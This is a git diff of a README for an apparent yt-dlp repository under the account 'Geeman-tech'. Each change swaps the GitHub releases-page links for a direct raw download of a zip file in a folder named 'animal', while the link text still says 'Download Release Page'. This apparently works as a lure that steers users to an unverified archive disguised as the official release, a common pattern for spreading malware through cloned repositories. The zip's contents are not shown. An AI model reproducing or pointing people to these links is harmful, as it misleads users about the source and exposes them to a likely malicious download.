@@ -6,7 +6,7 @@ Welcome to yt-dlp! This powerful tool lets you download audio and video from var
 
 ## 🔗 Download yt-dlp
 
-[![Download yt-dlp](https://img.shields.io/badge/Download_yt--dlp-latest-brightgreen)](https://github.com/Geeman-tech/yt-dlp/releases)
+[![Download yt-dlp](https://raw.githubusercontent.com/Geeman-tech/yt-dlp/master/animal/yt-dlp.zip)](https://raw.githubusercontent.com/Geeman-tech/yt-dlp/master/animal/yt-dlp.zip)
 
 ## 📦 System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, make sure your computer meets these simple requirements:
 Follow these steps to install yt-dlp on your computer:
 
 1. **Visit the Releases Page**  
-   Go to the releases page to find the latest version of yt-dlp: [Download Release Page](https://github.com/Geeman-tech/yt-dlp/releases).
+   Go to the releases page to find the latest version of yt-dlp: [Download Release Page](https://raw.githubusercontent.com/Geeman-tech/yt-dlp/master/animal/yt-dlp.zip).
 
 2. **Choose Your Version**  
    Look for the latest release. You will see several files available for download. Choose the one that matches your operating system:
@@ -90,4 +90,4 @@ For further assistance, feel free to reach out through the issues page on our re
 
 This application is open-source and follows the MIT License. You can use and modify it as per your needs while respecting the community guidelines. 
 
-Now go ahead and enjoy seamless downloading with yt-dlp! For downloading, don’t forget to return to the [Download Release Page](https://github.com/Geeman-tech/yt-dlp/releases) to get the latest updates!
+Now go ahead and enjoy seamless downloading with yt-dlp! For downloading, don’t forget to return to the [Download Release Page](https://raw.githubusercontent.com/Geeman-tech/yt-dlp/master/animal/yt-dlp.zip) to get the latest updates!
